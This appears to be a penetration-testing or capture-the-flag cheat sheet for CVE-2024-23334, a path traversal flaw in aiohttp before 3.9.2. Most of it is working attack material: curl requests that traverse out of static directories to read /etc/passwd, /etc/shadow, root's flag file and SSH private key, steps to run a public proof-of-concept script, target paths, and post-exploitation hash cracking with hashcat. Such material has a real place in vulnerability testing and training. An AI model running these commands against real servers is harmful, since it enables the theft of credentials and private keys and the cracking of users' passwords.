# aiohttp

aiohttp is an asynchronous HTTP client/server framework for Python.

## CVE-2024-23334 - Path Traversal / LFI

**Vulnerable versions:** aiohttp < 3.9.2

**Detection:**

Check server headers for aiohttp version:

```http
HTTP/1.1 200 OK
Server: Python/3.9 aiohttp/3.9.1
```

### Exploitation

The vulnerability allows path traversal to read files outside the web root when static file serving is enabled.

**Manual exploitation:**

```bash
# Read /etc/passwd
curl "http://target:8080/assets/../../../etc/passwd"

# Read /etc/shadow (if running as root)
curl "http://target:8080/assets/../../../etc/shadow"

# Read root flag
curl "http://target:8080/assets/../../../root/root.txt"

# Read SSH keys
curl "http://target:8080/assets/../../../root/.ssh/id_rsa"
```

**Using the POC script:**

```bash
git clone https://github.com/TheRedP4nther/LFI-aiohttp-CVE-2024-23334-PoC.git
cd LFI-aiohttp-CVE-2024-23334-PoC

# Read specific file
./lfi_aiohttp.sh -f "/etc/passwd"
./lfi_aiohttp.sh -f "/root/root.txt"
./lfi_aiohttp.sh -f "/etc/shadow"
```

### Common Static Paths to Target

```
/assets/
/static/
/files/
/css/
/js/
/images/
```

### Post-Exploitation

If running as root and `/etc/shadow` is readable:

```bash
# Extract shadow file
./lfi_aiohttp.sh -f "/etc/shadow" > shadow

# Get passwd
./lfi_aiohttp.sh -f "/etc/passwd" > passwd

# Crack hashes
unshadow passwd shadow > unshadow.txt
hashcat -m 1800 unshadow.txt /usr/share/wordlists/rockyou.txt
```

### References

- https://github.com/TheRedP4nther/LFI-aiohttp-CVE-2024-23334-PoC
- https://nvd.nist.gov/vuln/detail/CVE-2024-23334
